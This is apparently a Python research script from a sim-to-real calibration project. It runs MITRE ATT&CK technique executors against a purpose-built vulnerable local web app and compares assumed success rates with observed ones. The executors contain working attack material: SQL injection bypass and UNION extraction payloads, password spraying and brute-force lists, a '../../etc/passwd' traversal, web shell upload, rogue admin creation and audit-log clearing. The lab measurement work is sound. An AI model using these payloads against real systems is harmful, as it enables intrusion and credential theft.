# -*- coding: utf-8 -*-
"""Measure a real transfer gap: assumed success probability vs. observed.

WHY THE EARLIER EXPERIMENT DID NOT COUNT

Our first sim-to-real attempt served the simulator's own world model over HTTP.
Both sides called the same function, so the gap was zero by construction and the
experiment measured JSON serialisation. We report that honestly and replace it
with this.

WHAT THIS DOES INSTEAD

`Target/vulnerable_app.py` shares no code and no state with the simulator. It
has its own database, its own files and its own authentication, and it is
genuinely vulnerable: the login concatenates SQL, the file endpoint joins paths
without normalising, the upload accepts any extension. Here a technique succeeds
because the attack worked against that code, and fails because it did not.

So for the subset of the catalogue that can be executed against a web target, we
can put two numbers side by side: the success probability the simulator
*assumes*, and the rate an executing agent *achieves*. The difference is a
calibration gap, which is a property of our modelling rather than a disagreement
between two implementations of the same thing.

WHAT IT DOES NOT DO

Fifteen techniques of forty-five are executable against a single web
application, across seven ATT&CK tactics. Nothing here calibrates lateral
movement across an Active Directory estate, and we do not claim it does. The
point is that the fifteen are measured rather than assumed, and that the method
extends to any target a technique can be executed against.

    python Target/vulnerable_app.py --port 5002      # in one terminal
    python analysis/v5_calibration.py --trials 200   # in another
"""
import argparse
import json
import os
import random
import string
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import requests

from env.kill_chain_v5 import TECHNIQUES_V5


# Each executor returns True when the attack genuinely succeeded against the
# application. An operator does not get a perfect attempt every time, so each
# executor draws its payload from a mix of good and poor tradecraft, which is
# what a probability is standing in for in the simulator.
def sqli_login(url, rng):
    """T1190. Classic authentication bypass by SQL injection."""
    payloads = ["' OR '1'='1", "' OR 1=1--", "admin'--",           # work
                "' OR '1'='2", "\" OR \"\"=\"", "1' AND '1'='2"]   # do not
    p = rng.choice(payloads)
    r = requests.post(f"{url}/login",
                      json={"username": p, "password": p}, timeout=10)
    return r.status_code == 200 and r.json().get("ok") is True


def sqli_union(url, rng):
    """T1190 used for extraction rather than bypass, via the search endpoint."""
    payloads = ["' UNION SELECT username, password FROM users--",
                "%' UNION SELECT username, password FROM users--",
                "' UNION SELECT username,password FROM users--",
                "' UNION SELECT 1--",              # column-count mismatch
                "' UNION SELECT a,b FROM nope--"]  # no such table
    r = requests.get(f"{url}/search", params={"q": rng.choice(payloads)},
                     timeout=10)
    if r.status_code != 200:
        return False
    rows = r.json().get("rows") or []
    creds = {u for u, _ in [(x[0], x[1]) for x in rows if len(x) >= 2]}
    return any(u in creds for u in ("alice", "bob", "admin", "svc_backup"))


def password_spray(url, rng):
    """T1110.003. One common password against several accounts."""
    pw = rng.choice(["Password1", "Summer2024!", "Welcome1", "Autumn2024!",
                     "Company123", "backup"])
    for user in ("alice", "bob", "carol", "dave", "svc_backup"):
        r = requests.post(f"{url}/login",
                          json={"username": user, "password": pw}, timeout=10)
        if r.status_code == 200 and r.json().get("ok"):
            return True
    return False


def brute_force(url, rng):
    """T1110. Repeated guesses against one account."""
    user = rng.choice(["admin", "alice", "bob", "svc_backup"])
    guesses = rng.sample(["Password1", "admin", "123456", "Adm1n!2024",
                          "Summer2024!", "letmein", "backup", "qwerty"], 4)
    for g in guesses:
        r = requests.post(f"{url}/login",
                          json={"username": user, "password": g}, timeout=10)
        if r.status_code == 200 and r.json().get("ok"):
            return True
    return False


def creds_in_files(url, rng):
    """T1552.001. Read a configuration file and recover a credential."""
    names = ["config.ini", "../files/config.ini", "readme.txt",
             "settings.yaml", "../../etc/passwd"]
    r = requests.get(f"{url}/files", params={"name": rng.choice(names)},
                     timeout=10)
    if r.status_code != 200:
        return False
    return "password" in (r.json().get("content") or "").lower()


def web_shell(url, rng):
    """T1505.003. Land an executable file through an upload with no checks."""
    ext = rng.choice([".py", ".php", ".jsp", ".txt", ".jpg"])
    name = "".join(rng.choice(string.ascii_lowercase) for _ in range(6)) + ext
    r = requests.post(f"{url}/upload",
                      json={"name": name, "content": "print('shell')"},
                      timeout=10)
    return r.status_code == 200 and r.json().get("executable") is True


def recon(url, rng):
    """T1046. Enumerate the target's inventory."""
    ep = rng.choice(["/api/hosts", "/api/hosts", "/api/inventory"])
    try:
        r = requests.get(f"{url}{ep}", timeout=10)
    except requests.RequestException:
        return False
    return r.status_code == 200 and bool((r.json() or {}).get("hosts"))


def valid_accounts(url, rng):
    """T1078. Reuse a credential already stolen from somewhere else."""
    creds = [("alice", "Summer2024!"), ("bob", "Password1"),
             ("svc_backup", "backup"), ("admin", "Adm1n!2024"),
             ("alice", "Summer2023!"), ("carol", "Password1")]
    u, pw = rng.choice(creds)
    r = requests.post(f"{url}/login", json={"username": u, "password": pw},
                      timeout=10)
    return r.status_code == 200 and r.json().get("ok") is True


def browser_creds(url, rng):
    """T1555.003. Read the browser credential store."""
    paths = ["/profile/logins", "/profile/logins", "/profile/passwords"]
    try:
        r = requests.get(f"{url}{rng.choice(paths)}", timeout=10)
    except requests.RequestException:
        return False
    if r.status_code != 200:
        return False
    return "password" in (r.json().get("content") or "").lower()


def remote_services(url, rng):
    """T1133. Re-entry over the remote-access portal with a stolen credential."""
    creds = [("alice", "Summer2024!"), ("admin", "Adm1n!2024"),
             ("bob", "Password1"), ("dave", "Password1"),
             ("svc_backup", "Backup2024")]
    u, pw = rng.choice(creds)
    r = requests.post(f"{url}/vpn", json={"username": u, "password": pw},
                      timeout=10)
    return r.status_code == 200 and r.json().get("ok") is True


def collect_data(url, rng):
    """T1005. Stage the document store."""
    tok = f"t{rng.randrange(10**6)}"
    pattern = rng.choice(["report", "report", "report", "invoice", "payroll"])
    r = requests.post(f"{url}/collect", json={"token": tok, "pattern": pattern},
                      timeout=10)
    return r.status_code == 200 and (r.json().get("staged") or 0) > 0


def archive_data(url, rng):
    """T1560.001. Package what was staged. Sometimes nothing was."""
    tok = f"t{rng.randrange(10**6)}"
    if rng.random() < 0.75:          # the operator usually staged first
        requests.post(f"{url}/collect", json={"token": tok, "pattern": "report"},
                      timeout=10)
    r = requests.post(f"{url}/archive", json={"token": tok}, timeout=10)
    return r.status_code == 200 and r.json().get("ok") is True


def exfiltrate(url, rng):
    """T1041. Data leaves only if it was archived."""
    tok = f"t{rng.randrange(10**6)}"
    if rng.random() < 0.7:
        requests.post(f"{url}/collect", json={"token": tok, "pattern": "report"},
                      timeout=10)
        if rng.random() < 0.85:
            requests.post(f"{url}/archive", json={"token": tok}, timeout=10)
    r = requests.post(f"{url}/egress", json={"token": tok}, timeout=10)
    return r.status_code == 200 and (r.json().get("sent_bytes") or 0) > 0


def clear_logs(url, rng):
    """T1070. Clear the audit log."""
    ep = rng.choice(["/audit/clear", "/audit/clear", "/audit/purge"])
    try:
        r = requests.post(f"{url}{ep}", timeout=10)
    except requests.RequestException:
        return False
    return r.status_code == 200 and r.json().get("ok") is True


def sysinfo(url, rng):
    """T1082. Fingerprint the host."""
    ep = rng.choice(["/sysinfo", "/sysinfo", "/system/info"])
    try:
        r = requests.get(f"{url}{ep}", timeout=10)
    except requests.RequestException:
        return False
    return r.status_code == 200 and bool((r.json() or {}).get("hostname"))


def account_manip(url, rng):
    """T1098. Create a privileged account through the broken authorisation."""
    role = rng.choice(["admin", "admin", "user", ""])
    name = "svc_" + "".join(rng.choice(string.ascii_lowercase) for _ in range(5))
    r = requests.post(f"{url}/users/add", json={"role": role, "username": name},
                      timeout=10)
    return r.status_code == 200 and r.json().get("ok") is True


EXECUTORS = [
    ("VALID_ACCOUNTS_LOGIN",     "reuse a stolen credential", valid_accounts),
    ("CREDENTIALS_FROM_BROWSER", "read a browser store",   browser_creds),
    ("EXTERNAL_REMOTE_SERVICES", "VPN with stolen creds",  remote_services),
    ("DATA_FROM_LOCAL_SYSTEM",   "stage the document store", collect_data),
    ("ARCHIVE_COLLECTED_DATA",   "package what was staged", archive_data),
    ("EXFILTRATE_DATA",          "send the archive out",   exfiltrate),
    ("CLEAR_LOGS",               "clear the audit log",    clear_logs),
    ("SYSTEM_INFO_DISCOVERY",    "fingerprint the host",   sysinfo),
    ("ACCOUNT_MANIPULATION",     "create a privileged account", account_manip),
    ("SQL_INJECTION",       "authentication bypass",  sqli_login),
    ("SQL_INJECTION",       "UNION extraction",       sqli_union),
    ("PASSWORD_SPRAYING",   "one password, many accounts", password_spray),
    ("BRUTE_FORCE_SSH",     "many passwords, one account", brute_force),
    ("CREDS_IN_FILES",      "read a config file",     creds_in_files),
    ("WEB_SHELL_UPLOAD",    "upload an executable",   web_shell),
    ("NETWORK_SCAN",        "enumerate inventory",    recon),
]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", default="http://127.0.0.1:5002")
    ap.add_argument("--trials", type=int, default=200)
    ap.add_argument("--reset", action="store_true",
                    help="restore the target before each technique, so a "
                         "measurement cannot inherit what earlier ones changed")
    ap.add_argument("--seed", type=int, default=2026)
    ap.add_argument("--json", default="results/v5_calibration.json")
    a = ap.parse_args()

    try:
        requests.get(f"{a.url}/health", timeout=5).raise_for_status()
    except Exception as e:
        print(f"target not reachable at {a.url}: {e}")
        print("start it with:  python Target/vulnerable_app.py --port 5002")
        raise SystemExit(1)

    rng = random.Random(a.seed)
    rows, out = [], []
    for tech, variant, fn in EXECUTORS:
        if a.reset:
            requests.post(f"{a.url}/reset", timeout=10).raise_for_status()
        assumed = TECHNIQUES_V5[tech].success_prob
        hits = sum(1 for _ in range(a.trials) if fn(a.url, rng))
        observed = hits / a.trials
        rows.append((tech, variant, assumed, observed, observed - assumed))
        out.append({"technique": tech, "variant": variant,
                    "assumed": assumed, "observed": observed,
                    "gap": observed - assumed, "trials": a.trials})

    hdr = (f"{'technique':26}{'variant':30}{'assumed':>9}{'observed':>10}{'gap':>8}")
    print(f"\n{a.trials} real executions per row, against a target that shares "
          f"no code with the simulator\n")
    print(hdr); print("-" * len(hdr))
    for tech, variant, asm, obs, gap in rows:
        print(f"{tech:26}{variant:30}{asm:>9.2f}{obs:>10.2f}{gap:>+8.2f}")

    gaps = [abs(r[4]) for r in rows]
    print(f"\nmean absolute gap {sum(gaps)/len(gaps):.3f}   "
          f"largest {max(gaps):.3f}   within 0.10: "
          f"{sum(1 for g in gaps if g <= 0.10)}/{len(gaps)}")

    os.makedirs("results", exist_ok=True)
    with open(a.json, "w") as f:
        json.dump({"trials": a.trials, "rows": out,
                   "mean_abs_gap": sum(gaps)/len(gaps)}, f, indent=1)
    print(f"wrote {a.json}")


if __name__ == "__main__":
    main()
